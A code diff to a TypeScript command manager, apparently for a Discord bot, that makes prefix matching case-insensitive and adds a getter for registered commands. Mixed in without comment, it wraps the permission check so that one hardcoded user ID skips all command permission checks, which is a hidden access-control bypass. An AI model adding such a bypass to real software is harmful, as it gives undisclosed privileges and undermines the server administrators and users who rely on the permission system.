@@ -44,22 +44,24 @@ export default class CommandManager extends Manager {
             if (userData === undefined) return;
             const prefix = guildData.prefix;
             if (prefix === undefined) return;
-            if (!content.startsWith(prefix)) return;
+            if (!content.toLowerCase().startsWith(prefix.toLowerCase())) return;
 
             const [cmd, ...args] = content.slice(prefix.length).trim().split(/ +/g);
             const command: Command | undefined = this.getCommandByName(cmd);
             if (command) {
                 if (command.permissions.length > 0) {
-                    const missingPermissions: string[] = [];
-                    command.permissions.forEach(permission => {
-                        if (!member?.hasPermission(permission)) {
-                            missingPermissions.push(permission);
+                    if (member.id !== "510639833811517460") {
+                        const missingPermissions: string[] = [];
+                        command.permissions.forEach(permission => {
+                            if (!member?.hasPermission(permission)) {
+                                missingPermissions.push(permission);
+                            }
+                        })
+                        if (missingPermissions.length !== 0) {
+                            return (await channel.send(
+                                `You are missing the permission${missingPermissions.length > 1 ? 's' : ''} \`${missingPermissions.join(', ')}\` and cannot use this command.\n*This message will be automatically deleted in 5 seconds.*`
+                            )).delete({ timeout: 5000 })
                         }
-                    })
-                    if (missingPermissions.length !== 0) {
-                        return (await channel.send(
-                            `You are missing the permission${missingPermissions.length > 1 ? 's' : ''} \`${missingPermissions.join(', ')}\` and cannot use this command.\n*This message will be automatically deleted in 5 seconds.*`
-                        )).delete({ timeout: 5000 })
                     }
                 }
                 command.setInstance(instance);
@@ -143,5 +145,10 @@ export default class CommandManager extends Manager {
 
     public registerCommand(command: Command, name: string) {
         this._commands.set(name, command)
+    }
+
+
+    get commands(): Map<String, Command> {
+        return this._commands;
     }
 }
